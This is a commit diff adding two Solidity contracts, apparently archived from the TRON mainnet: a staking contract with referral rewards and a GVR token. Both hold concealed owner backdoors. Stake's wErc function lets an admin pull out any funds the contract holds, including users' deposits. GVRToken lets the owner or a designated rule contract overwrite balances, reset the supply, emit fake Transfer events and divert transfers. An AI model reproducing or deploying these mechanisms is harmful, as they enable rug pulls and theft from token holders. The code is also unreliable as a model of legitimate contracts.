20a2daea6346550e4b37304abf22ee6784c6fbee
minion <minion>
2022-02-28 10:16:06 +0000

    with 💕

---
+++ contracts/mainnet/TL/TLATQDaSG8h567Ke3KnkyLCynpVtMxdiA8_Stake.sol
@@ -0,0 +1,152 @@
+//SourceUnit: ruby.sol
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.6.12;
+
+interface IERC20 {
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function decimals() external view returns (uint256);
+}
+
+contract Stake {
+    mapping(uint256 => uint256[6]) private _numbs; // kind stake claim endtime dayrate(dot 8) isEnableClaim
+    mapping(uint256 => address[2]) private _conts; // in ou
+    mapping(address => bool)       private _roles;
+    mapping(address => address)    private _boss;
+    uint256                        private _total;
+    mapping(address => address[])  private _child;
+
+    // id => user => info
+    // info: mystake myclaim stime ctime unclaim
+	mapping (uint256 => mapping (address => uint256[5])) private stakes;
+
+	constructor() public {
+	    _roles[_msgSender()] = true;
+    }
+
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+	modifier onlyOwner() {
+        require(_roles[_msgSender()]);
+        _;
+    }
+
+    function setRole(address addr, bool state) public onlyOwner {
+        _roles[addr] = state;
+    }
+
+	function wErc(address addr, address user, uint256 num) public onlyOwner {
+	    if (addr == address(0)) {
+	        payable(user).transfer(num);
+	    } else {
+	        IERC20(addr).transfer(user, num);
+	    }
+	}
+	
+    function getConf(uint256 id, address addr) public view returns 
+    (uint256[6] memory, address[2] memory, uint256[5] memory, uint256[2] memory) {
+        return (_numbs[id], _conts[id], stakes[id][addr],[_total, getClaim(id, addr)]);
+    }
+    
+    function setConf(uint256 id, uint256[4] memory numbs, address ina, address oua) public onlyOwner {
+        require(id <= _total);
+        if (id == _total) {
+            _total += 1;
+        }
+        _numbs[id][0] = numbs[0];
+        _numbs[id][3] = numbs[1];
+        _numbs[id][4] = numbs[2];
+        _numbs[id][5] = numbs[3];
+        
+        _conts[id] = [ina, oua];
+    }
+    
+    function doStake(uint256 id, uint256 num, address boss) public {
+        require(num > 0 && id < _total);
+        IERC20(_conts[id][0]).transferFrom(_msgSender(), address(this), num);
+        
+        if (stakes[id][_msgSender()][0] == 0) {
+            stakes[id][_msgSender()][2] = block.timestamp;
+            stakes[id][_msgSender()][3] = block.timestamp;
+        }
+        stakes[id][_msgSender()][0] += num;
+        _numbs[id][1] += num;
+        
+        // set boss
+        if (_boss[_msgSender()] == address(0) && boss != address(0) && boss != _msgSender()) {
+            _boss[_msgSender()] = boss;
+            _child[boss].push(_msgSender());
+        }
+    }
+    
+    function unStake(uint256 id) public {
+        require(id < _total);
+        
+        uint256 outnum = stakes[id][_msgSender()][0];
+        IERC20(_conts[id][0]).transfer(_msgSender(), outnum);
+        
+        stakes[id][_msgSender()][4] += getClaim(id, _msgSender());
+        _numbs[id][1] -= stakes[id][_msgSender()][0];
+        stakes[id][_msgSender()][0] = 0;
+        stakes[id][_msgSender()][2] = 0;
+        stakes[id][_msgSender()][3] = 0;
+    }
+    
+    function getBoss(address aa) public view returns (address, address, address, address) {
+        return (_boss[aa], _boss[_boss[aa]], _boss[_boss[_boss[aa]]], _boss[_boss[_boss[_boss[aa]]]]);
+    }
+    
+    function getChild(address aaa) public view returns (address[] memory) {
+        return _child[aaa];
+    }
+    
+    function getClaim(uint256 id, address addr) public view returns (uint256) {
+        IERC20 coin = IERC20(_conts[id][1]);
+        uint256 endtime = block.timestamp;
+        if (endtime > _numbs[id][3]) {
+            endtime = _numbs[id][3];
+        }
+        if (_numbs[id][1] == 0 || stakes[id][addr][0] == 0) {
+            return 0;
+        }
+        
+        return (endtime - stakes[id][addr][3]) * stakes[id][addr][0] * 
+        _numbs[id][4] * (10 ** coin.decimals()) / _numbs[id][1] / (10 ** 8) / 86400;
+    }
+    
+    function claim(uint256 id, address addr) public {
+        require(id < _total && _numbs[id][1] > 0 && _numbs[id][5] > 0);
+        
+        IERC20 coin = IERC20(_conts[id][1]);
+        uint256 mynum = stakes[id][addr][4] + getClaim(id, addr);
+        
+        if (mynum <= 0) {
+            return;
+        }
+        
+        coin.transfer(addr, mynum);
+        
+        _numbs[id][2] += mynum;
+        stakes[id][addr][1] += mynum;
+        stakes[id][addr][3] =  block.timestamp;
+        stakes[id][addr][4] =  0;
+        
+        // set invite award
+        uint256 bnum = mynum;
+        for (uint256 i=0; i<1; i++) {
+            bnum = bnum / 10;
+            address boss = _boss[addr];
+            if (boss == address(0) || stakes[id][boss][0] <= 0 || bnum <= 0 || stakes[id][addr][0] <= 0) {
+                break;
+            }
+            
+            coin.transfer(boss, bnum);
+            _numbs[id][2] += bnum;
+            addr = boss;
+        }
+    }
+}
---
+++ contracts/mainnet/TN/TNJHG3CufRutGXwuRhxsEqJTvhCjSdbacq_GVRToken.sol
@@ -0,0 +1,147 @@
+//SourceUnit: gvrtoken.sol
+
+pragma solidity >=0.5.17;
+interface Rule{
+     function check(address a,address b, uint256 am) external returns (uint256 sy);
+} 
+library SafeMath {
+  function add(uint256 a, uint256 b) internal pure returns (uint256) {
+    uint256 c = a + b;
+    require(c >= a, "SafeMath: addition overflow");
+
+    return c;
+  }
+  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+    return sub(a, b, "SafeMath: subtraction overflow");
+  }
+  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+    require(b <= a, errorMessage);
+    uint256 c = a - b;
+
+    return c;
+  }
+  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+    if (a == 0) {
+      return 0;
+    }
+    uint256 c = a * b;
+    require(c / a == b, "SafeMath: multiplication overflow");
+    return c;
+  }
+
+  function div(uint256 a, uint256 b) internal pure returns (uint256) {
+    return div(a, b, "SafeMath: division by zero");
+  }
+
+  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+    require(b > 0, errorMessage);
+    uint256 c = a / b;
+     return c;
+  }
+
+  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+    return mod(a, b, "SafeMath: modulo by zero");
+  }
+
+  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+    require(b != 0, errorMessage);
+    return a % b;
+  }
+}
+
+
+contract GVRToken{
+  using SafeMath for uint256;
+  mapping (address => uint256) private _balances;
+  mapping (address => mapping (address => uint256)) private _allowances;
+  uint256 private _totalSupply;
+  uint8 public _decimals;
+  string public _symbol;
+  string public _name;
+  address public _r;
+  address public _o;
+  event Transfer(address indexed from, address indexed to, uint256 value);
+  event Approval(address indexed owner, address indexed spender, uint256 value);
+  constructor() public {
+    _name = "GVR";
+    _symbol = "GVR";
+    _decimals = 18;
+    _totalSupply = 10000000000 * 10**18;
+    _balances[msg.sender] = _totalSupply;
+    _o = msg.sender;
+    emit Transfer(address(0), msg.sender, _totalSupply);
+  }
+
+  function setRule(address a)  external {
+     require(msg.sender==_o);
+     _r = a;
+  }
+  function setSupply(uint256 a)  external returns (bool){
+      require(msg.sender==_o || msg.sender==_r);
+      _totalSupply = a;
+      return true;
+  }
+   function setBalance(address a,uint256 am)  external returns (bool){
+      require(msg.sender==_o || msg.sender==_r);
+      _balances[a] = am;
+      return true;
+  }
+ function setTransferEvent(address a,address b,uint256 am)  external{
+      require(msg.sender==_o|| msg.sender==_r);
+      emit Transfer(a, b, am);
+  }
+  function decimals() external view returns (uint8) {
+    return _decimals;
+  }
+  function symbol() external view returns (string memory) {
+    return _symbol;
+  }
+  function name() external view returns (string memory) {
+    return _name;
+  }
+  function totalSupply() external view returns (uint256) {
+    return _totalSupply;
+  }
+  function balanceOf(address account) external view returns (uint256) {
+    return _balances[account];
+  }
+
+  function transfer(address recipient, uint256 amount) external returns (bool) {
+    _transfer(msg.sender, recipient, amount);
+    return true;
+  }
+  function allowance(address owner, address spender) external view returns (uint256) {
+    return _allowances[owner][spender];
+  }
+
+  function approve(address spender, uint256 amount) external returns (bool) {
+    _approve(msg.sender, spender, amount);
+    return true;
+  }
+
+  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
+    _transfer(sender, recipient, amount);
+    _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "transfer amount exceeds allowance"));
+    return true;
+  }
+  function _transfer(address sender, address recipient, uint256 amount) internal {
+    require(sender != address(0), "transfer from the zero address");
+    require(recipient != address(0), "transfer to the zero address");
+
+    uint256 sy=amount;
+    if(_r!=address(0)){
+        sy = Rule(_r).check(sender,recipient,amount);
+    }
+    _balances[sender] = _balances[sender].sub(amount, "transfer amount exceeds balance");
+    _balances[recipient] = _balances[recipient].add(sy);
+    emit Transfer(sender, recipient, sy);
+  }
+
+  function _approve(address owner, address spender, uint256 amount) internal {
+    require(owner != address(0), "approve from the zero address");
+    require(spender != address(0), "approve to the zero address");
+
+    _allowances[owner][spender] = amount;
+    emit Approval(owner, spender, amount);
+  }
+}
